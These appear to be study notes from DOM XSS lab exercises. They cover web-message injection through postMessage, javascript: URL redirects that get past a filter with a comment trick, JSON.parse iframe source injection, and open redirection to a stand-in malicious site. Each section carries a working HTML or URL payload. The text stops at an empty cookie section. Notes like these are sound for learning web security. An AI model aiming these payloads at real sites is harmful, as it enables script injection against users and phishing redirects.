#  DOM XSS
## DOM XSS - Exploiting web messages
- In this case the web app doesn't check the origin of the web messages 
![](Pasted%20image%2020220225132252.png)
- So we do something like this to exploit this 
```HTML
<iframe src="target-website" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"
```
- The \* at the end defines the target origin and the `eventListener` accepts the request.
## DOM based redirection vulnerability
- This is the vulnerable code:
![](Pasted%20image%2020220225132937.png)
- It's taking in the data from the web message and using it to redirect to that URL.
- The `if` statement requires atleast one http: or https: in the provided string. For that we can just add it add the end as a comment, it's still a part of the string (url) but the browser will treat it as a comment and just execute our javascript code.
```HTML
<iframe src="target-website.com" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')"
```
## DOM XSS - Web message + JSON.parse
- Vulnerable code: 
![](Pasted%20image%2020220225133815.png)
- The `load-channel` type in the JSON enables us to set the src for `iframe` element that is being created using the web message. 
- We can provide `javascript:print()` to execute javascript code.
```HTML
<iframe src="target-website.com" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
``` 
## DOM XSS - Open-redirection
- Vulnerable code: 
![](Pasted%20image%2020220225140200.png)
- This anchor tag is vulnerable to open-redirect vulnerability. We can use the `url` parameter to redirect the victim to the desired location
```HTML
https://target-website/post?postId=7&url=http://malicious-website.com
```
- Notice the part after the `&url` that is the site where we want to point the victim towards.
## DOM XSS - Altering the Cookie
- Vulnerable code: 
![](Pasted%20image%2020220225141012.png)
- 